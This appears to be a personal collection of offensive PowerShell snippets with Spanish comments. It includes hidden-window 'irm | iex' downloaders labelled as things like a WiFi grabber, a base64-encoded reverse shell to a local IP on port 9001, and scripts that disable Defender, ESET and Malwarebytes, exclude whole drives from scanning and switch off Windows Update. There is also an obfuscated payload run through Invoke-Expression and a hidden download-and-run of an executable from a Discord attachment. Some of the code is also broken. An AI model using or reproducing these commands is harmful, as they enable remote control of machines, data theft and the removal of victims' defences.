Set-ExecutionPolicy unrestricted -Force; Invoke-WebRequest -Uri "https://download.eset.com/com/eset/apps/home/essp/windows/latest/essp_nt64.exe" -OutFile "$env:USERPROFILE\Desktop\essp_nt64.exe"; Start-Process -FilePath "$env:USERPROFILE\Desktop\essp_nt64.exe"; Invoke-WebRequest -Uri "https://laptop-updates.brave.com/download/BRV010?bitness=64" -OutFile "$env:USERPROFILE\Desktop\brave.exe";Start-Process -FilePath "$env:USERPROFILE\Desktop\brave.exe"; irm https://get.activated.win | iex ;






rs3.ps1 powershell -w h -NoP -Ep Bypass; irm https://rb.gy/67y5f3 | iex 
Wifi Grab powershell -w h -NoP -Ep Bypass; irm https://rb.gy/bk5rpv | iex
dcplus powershell -w h -NoP -Ep Bypass; irm https://rb.gy/40f010 | iex
#Este es
DL exe rs0 irm https://rb.gy/650cr7 | iex

STRING powershell Start-Process powershell -ArgumentList "-Ep Bypass; irm https://massgrave.dev/get | iex" -Verb runAs

https://discord.com/channels/749701582052130969/895907015614930984/1268570625702887536

powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADQAMQAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

Start-Process -FilePath "C:\Program Files\Malwarebytes\Anti-Malware\mbam.exe" -ArgumentList "/disableprotection" -Wait


# Detener y deshabilitar ESET
Stop-Service -Name "ekrn" -Force;
Set-Service -Name "ekrn" -StartupType Disabled;
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ekrn" -Name "Start" -Value 4;

# Detener y deshabilitar Malwarebytes
Stop-Service -Name "MBAMService" -Force;
Set-Service -Name "MBAMService" -StartupType Disabled;
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\MBAMService" -Name "Start" -Value 4;

# Terminar procesos si siguen activos
Stop-Process -Name "ekrn" -Force -ErrorAction SilentlyContinue;
Stop-Process -Name "mbamservice" -Force -ErrorAction SilentlyContinue;

CgAKAFMAdABvAHAALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAIgBlAGsAcgBuACIAIAAtAEYAbwByAGMAZQA7ACAAUwBlAHQALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAIgBlAGsAcgBuACIAIAAtAFMAdABhAHIAdAB1AHAAVAB5AHAAZQAgAEQAaQBzAGEAYgBsAGUAZAA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABlAGsAcgBuACIAIAAtAE4AYQBtAGUAIAAiAFMAdABhAHIAdAAiACAALQBWAGEAbAB1AGUAIAA0ADsAIABTAHQAbwBwAC0AUwBlAHIAdgBpAGMAZQAgAC0ATgBhAG0AZQAgACIATQBCAEEATQBTAGUAcgB2AGkAYwBlACIAIAAtAEYAbwByAGMAZQA7ACAAZQB0AC0AUwBlAHIAdgBpAGMAZQAgAC0ATgBhAG0AZQAgACIATQBCAEEATQBTAGUAcgB2AGkAYwBlACIAIAAtAFMAdABhAHIAdAB1AHAAVAB5AHAAZQAgAEQAaQBzAGEAYgBsAGUAZAA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABNAEIAQQBNAFMAZQByAHYAaQBjAGUAIgAgAC0ATgBhAG0AZQAgACIAUwB0AGEAcgB0ACIAIAAtAFYAYQBsAHUAZQAgADQAOwAgAFMAdABvAHAALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAIgBlAGsAcgBuACIAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA7ACAAdABvAHAALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAIgBtAGIAYQBtAHMAZQByAHYAaQBjAGUAIgAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlADsACgAKAA==

# Este script es solo un ejemplo educativo y no debe ser utilizado para actividades malintencionadas
$bytes = [System.Convert]::FromBase64String(CgAKAFMAdABvAHAALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAIgBlAGsAcgBuACIAIAAtAEYAbwByAGMAZQA7ACAAUwBlAHQALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAIgBlAGsAcgBuACIAIAAtAFMAdABhAHIAdAB1AHAAVAB5AHAAZQAgAEQAaQBzAGEAYgBsAGUAZAA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABlAGsAcgBuACIAIAAtAE4AYQBtAGUAIAAiAFMAdABhAHIAdAAiACAALQBWAGEAbAB1AGUAIAA0ADsAIABTAHQAbwBwAC0AUwBlAHIAdgBpAGMAZQAgAC0ATgBhAG0AZQAgACIATQBCAEEATQBTAGUAcgB2AGkAYwBlACIAIAAtAEYAbwByAGMAZQA7ACAAZQB0AC0AUwBlAHIAdgBpAGMAZQAgAC0ATgBhAG0AZQAgACIATQBCAEEATQBTAGUAcgB2AGkAYwBlACIAIAAtAFMAdABhAHIAdAB1AHAAVAB5AHAAZQAgAEQAaQBzAGEAYgBsAGUAZAA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABNAEIAQQBNAFMAZQByAHYAaQBjAGUAIgAgAC0ATgBhAG0AZQAgACIAUwB0AGEAcgB0ACIAIAAtAFYAYQBsAHUAZQAgADQAOwAgAFMAdABvAHAALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAIgBlAGsAcgBuACIAIAAtAEYAbwByAGMAZQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA7ACAAdABvAHAALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAIgBtAGIAYQBtAHMAZQByAHYAaQBjAGUAIgAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlADsACgAKAA==)
[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, @())



CgAKAAoAUwBlAHQALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAFUAbgByAGUAcwB0AHIAaQBjAHQAZQBkACAALQBGAG8AcgBjAGUAOwAgAFMAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEQAaQBzAGEAYgBsAGUAUwBjAHIAaQBwAHQAUwBjAGEAbgBuAGkAbgBnACAAJAB0AHIAdQBlADsACgBOAGUAdwAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAiAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAiACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsADsACgAgAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAiAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAiACAALQBOAGEAbQBlACAAIgBEAGkAcwBhAGIAbABlAEEAbgB0AGkAUwBwAHkAdwBhAHIAZQAiACAALQBWAGEAbAB1AGUAIAAxADsACgAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwAUgBlAGEAbAAtAFQAaQBtAGUAIABQAHIAbwB0AGUAYwB0AGkAbwBuACIAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAOwAKACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAARABlAGYAZQBuAGQAZQByAFwAUgBlAGEAbAAtAFQAaQBtAGUAIABQAHIAbwB0AGUAYwB0AGkAbwBuACIAIAAtAE4AYQBtAGUAIAAiAEQAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIgAgAC0AVgBhAGwAdQBlACAAMQA7AAoAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABEAGUAZgBlAG4AZABlAHIAIgAgAC0ATgBhAG0AZQAgACIARABpAHMAYQBiAGwAZQBSAG8AdQB0AGkAbgBlAGwAeQBUAGEAawBpAG4AZwBBAGMAdABpAG8AbgAiACAALQBWAGEAbAB1AGUAIAAxADsACgAgAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAiAEgASwBMAE0AOgBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgAiACAALQBOAGEAbQBlACAAIgBTAGUAcgB2AGkAYwBlAEsAZQBlAHAAQQBsAGkAdgBlACIAIAAtAFYAYQBsAHUAZQAgADAAOwAKACAATgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAFkAUwBUAEUATQBcAEMAdQByAHIAZQBuAHQAQwBvAG4AdAByAG8AbABTAGUAdABcAFMAZQByAHYAaQBjAGUAcwBcAFMAZQBjAHUAcgBpAHQAeQBIAGUAYQBsAHQAaABTAGUAcgB2AGkAYwBlACIAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAOwAKACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABTAGUAcgB2AGkAYwBlAHMAXABTAGUAYwB1AHIAaQB0AHkASABlAGEAbAB0AGgAUwBlAHIAdgBpAGMAZQAiACAALQBOAGEAbQBlACAAIgBTAHQAYQByAHQAIgAgAC0AVgBhAGwAdQBlACAANAA7AAoAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAVABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlADsAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBNAEEAUABTAFIAZQBwAG8AcgB0AGkAbgBnACAAMAA7ACAAUwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAAJAB0AHIAdQBlADsAIABBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABlAG4AdgA6AFMAeQBzAHQAZQBtAEQAcgBpAHYAZQAgADsAIABBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABlAG4AdgA6AFQARQBNAFAAOwAgAEEAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAEUAeAB0AGUAbgBzAGkAbwBuACAAIgAuAGUAeABlACIAOwAgAFMAZQB0AC0AUwBlAHIAdgBpAGMAZQAgAC0ATgBhAG0AZQAgACIAdwB1AGEAdQBzAGUAcgB2ACIAIAAtAFMAdABhAHIAdAB1AHAAVAB5AHAAZQAgAEQAaQBzAGEAYgBsAGUAZAA7ACAATgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIgAgAC0ATgBhAG0AZQAgACIAVwBpAG4AZABvAHcAcwBVAHAAZABhAHQAZQAiACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAOwAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAVwBpAG4AZABvAHcAcwBVAHAAZABhAHQAZQAiACAALQBOAGEAbQBlACAAIgBBAFUAIgAgAC0ARgBvAHIAYwBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7ACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAVwBpAG4AZABvAHcAcwBVAHAAZABhAHQAZQBcAEEAVQAiACAALQBOAGEAbQBlACAAIgBOAG8AQQB1AHQAbwBVAHAAZABhAHQAZQAiACAALQBWAGEAbAB1AGUAIAAxACAALQBUAHkAcABlACAARABXAG8AcgBkADsAIABTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAE8ARgBUAFcAQQBSAEUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABXAGkAbgBkAG8AdwBzAFUAcABkAGEAdABlAFwAQQBVACIAIAAtAE4AYQBtAGUAIAAiAEEAVQBPAHAAdABpAG8AbgBzACIAIAAtAFYAYQBsAHUAZQAgADEAIAAtAFQAeQBwAGUAIABEAFcAbwByAGQAOwAKAAoACgAKAAoACgAKAA==

Set-ExecutionPolicy Unrestricted -Force; Set-MpPreference -DisableScriptScanning $true;
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null;
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1;
 New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force | Out-Null;
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1;
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1;
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0;
 New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Force | Out-Null;
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Name "Start" -Value 4;
 Set-MpPreference -DisableRealTimeMonitoring $true; Set-MpPreference -MAPSReporting 0; Set-MpPreference -DisableBlockAtFirstSeen $true; Add-MpPreference -ExclusionPath $env:SystemDrive ; Add-MpPreference -ExclusionPath $env:TEMP; Add-MpPreference -ExclusionExtension ".exe"; Set-Service -Name "wuauserv" -StartupType Disabled; New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows" -Name "WindowsUpdate" -Force | Out-Null
; New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "AU" -Force | Out-Null; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -Value 1 -Type DWord; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "AUOptions" -Value 1 -Type DWord;



$script = @'

New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1; New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force | Out-Null; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "ServiceKeepAlive" -Value 0; New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Force | Out-Null; Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService" -Name "Start" -Value 4; Set-MpPreference -DisableRealTimeMonitoring $true; Set-MpPreference -MAPSReporting 0; Set-MpPreference -DisableScriptScanning $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Add-MpPreference -ExclusionPath $env:SystemDrive ; Add-MpPreference -ExclusionPath $env:TEMP; Add-MpPreference -ExclusionExtension ".exe"; Set-Service -Name "wuauserv" -StartupType Disabled; New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows" -Name "WindowsUpdate" -Force | Out-Null
; New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name "AU" -Force | Out-Null; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -Value 1 -Type DWord; Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "AUOptions" -Value 1 -Type DWord;

'@

$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encoded = [Convert]::ToBase64String($bytes)
Write-Output $encoded


# Código Base64 comprimido
$encoded_script = "eJyllfFP01AQx78/768gZDFd4ho2jRENJjBFSQwYhvEHQmRuE6rAyNgYxOx/93PXtbbdWiHkpX3v3rv73t33rq811fVZn3Sgro60pi2edbW0qbZC5ld67bM9L/WCs7do1NzqC1aHqdWmNhit9PxIHTQ6ulCkoa40WejtI83UxPaHfrHu+4ntTvDS1Yid3y7dIC+jBLmIn2ObjaWR+o8RZ+CNweuyHrPT0+UijlURhvroVlntIIOZ3T/0ecB7XJnZHnJYahlURrra8zdWEfLjPWctn+o51LamrEfahcEp1TpPmTWLKVoJxg7ST8b/Iu7qHhzDvwR/B8nWxzrhrEV3tenBGHOGtwi/Q6SgpJYdYrtixOhDGG+g/cft1xajiFPOSKj3zBOebd3yNqse0ZvtMm4y6lS7B15imzBU5Sfpj6DAnPX6xqLjs/sh/W85n4FynlZuORLjY+CZbnm2x87KnXNl9n0/jxzpRG8YX+F1lxugUfgyYp2q+IpZN6lfIxfXvBBnBMpjammYPXYGudzyXJjOmXdWq7JGB97J1/6O2bEs70stkrGHp1s8233V1Ae4vPY63jAijzjOKInOYmjrnZ4RzyrcOU/fOet79NXe6/peglLWAeXf8j8p4I7PM3JKHusP7qs62lNqd1Gotknzir9D6NII5oa5O7fqS1ltUXbXPkQ/z0pev6a/owoOvA=="

# Decodificar y descomprimir
$compressed_script = [System.Convert]::FromBase64String($encoded_script)
$script_bytes = [System.IO.Compression.DeflateStream]::Decompress($compressed_script)
$script = [System.Text.Encoding]::Unicode.GetString($script_bytes)

# Ejecutar el script
Invoke-Expression $script

############################################################################################################################


# Función para detener servicios de Malwarebytes
function Stop-MalwarebytesServices {
    $services = Get-Service | Where-Object { $_.DisplayName -like "*Malwarebytes*" }
    foreach ($service in $services) {
        try {
            Stop-Service -Name $service.Name -Force -ErrorAction Stop
            Write-Output "Servicio $($service.Name) detenido."
        } catch {
            Write-Output "Error al detener el servicio $($service.Name): $_"
        }
    }
}

# Función para detener procesos de Malwarebytes
function Stop-MalwarebytesProcesses {
    $processes = Get-Process | Where-Object { $_.Name -like "*Malwarebytes*" }
    foreach ($process in $processes) {
        try {
            Stop-Process -Name $process.Name -Force -ErrorAction Stop
            Write-Output "Proceso $($process.Name) detenido."
        } catch {
            Write-Output "Error al detener el proceso $($process.Name): $_"
        }
    }
}

# Función para desinstalar Malwarebytes
function Uninstall-Malwarebytes {
    $app = Get-CimInstance -ClassName Win32_Product | Where-Object { $_.Name -like "*Malwarebytes*" }
    if ($app) {
        try {
            $app.Uninstall() | Out-Null
            Write-Output "Malwarebytes desinstalado."
        } catch {
            Write-Output "Error al desinstalar Malwarebytes: $_"
        }
    } else {
        Write-Output "Malwarebytes no encontrado en la lista de productos instalados. Intentando desinstalación directa..."

        # Intentar desinstalación directa con msiexec
        $msiexecPath = "$env:SystemRoot\System32\msiexec.exe"
        $uninstallString = " /x {ProductCode} /quiet /norestart"
        $productCode = (Get-CimInstance Win32_Product | Where-Object { $_.Name -like "*Malwarebytes*" }).IdentifyingNumber
        if ($productCode) {
            Start-Process -FilePath $msiexecPath -ArgumentList $uninstallString.Replace("{ProductCode}", $productCode) -Wait
            Write-Output "Malwarebytes desinstalado usando msiexec."
        } else {
            Write-Output "No se pudo encontrar el ProductCode de Malwarebytes para desinstalación directa."
        }
    }
}

# Función para eliminar entradas de registro de Malwarebytes
function Remove-MalwarebytesRegistryEntries {
    $registryPaths = @(
        "HKLM:\SOFTWARE\Malwarebytes",
        "HKLM:\SOFTWARE\WOW6432Node\Malwarebytes",
        "HKCU:\Software\Malwarebytes"
    )

    foreach ($path in $registryPaths) {
        if (Test-Path $path) {
            try {
                Remove-Item -Path $path -Recurse -Force -ErrorAction Stop
                Write-Output "Eliminada la entrada de registro: $path"
            } catch {
                Write-Output "Error al eliminar la entrada de registro $path: $_"
            }
        } else {
            Write-Output "Entrada de registro no encontrada: $path"
        }
    }
}

# Función para confirmar que los servicios están detenidos
function Confirm-ServicesStopped {
    $services = Get-Service | Where-Object { $_.DisplayName -like "*Malwarebytes*" }
    foreach ($service in $services) {
        try {
            $svc = Get-Service -Name $service.Name
            if ($svc.Status -ne 'Stopped') {
                Write-Output "El servicio $($service.Name) sigue en ejecución. Intentando detener de nuevo..."
                Stop-Service -Name $service.Name -Force -ErrorAction Stop
                Write-Output "Servicio $($service.Name) detenido."
            } else {
                Write-Output "El servicio $($service.Name) está detenido."
            }
        } catch {
            Write-Output "Error al verificar el estado del servicio $($service.Name): $_"
        }
    }
}

# Ejecutar funciones
Stop-MalwarebytesServices
Stop-MalwarebytesProcesses
Uninstall-Malwarebytes
Remove-MalwarebytesRegistryEntries
Confirm-ServicesStopped

Write-Output "Proceso de eliminación de Malwarebytes completado."


############################################################################################################################

PowerShell.exe -WindowStyle hidden {

 
   Set-ExecutionPolicy unrestricted -Force;
   Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1258904556398575775/1269432329000980613/rs2.exe?ex=66b00a7c&is=66aeb8fc&hm=e549af8175dc96c9f2c86e9c50eb2701e2890fc2c0d479750ef14902a54355d5&" -OutFile "$env:temp\rs2.exe"; powershell "$env:temp\rs2.exe";
    

    
}

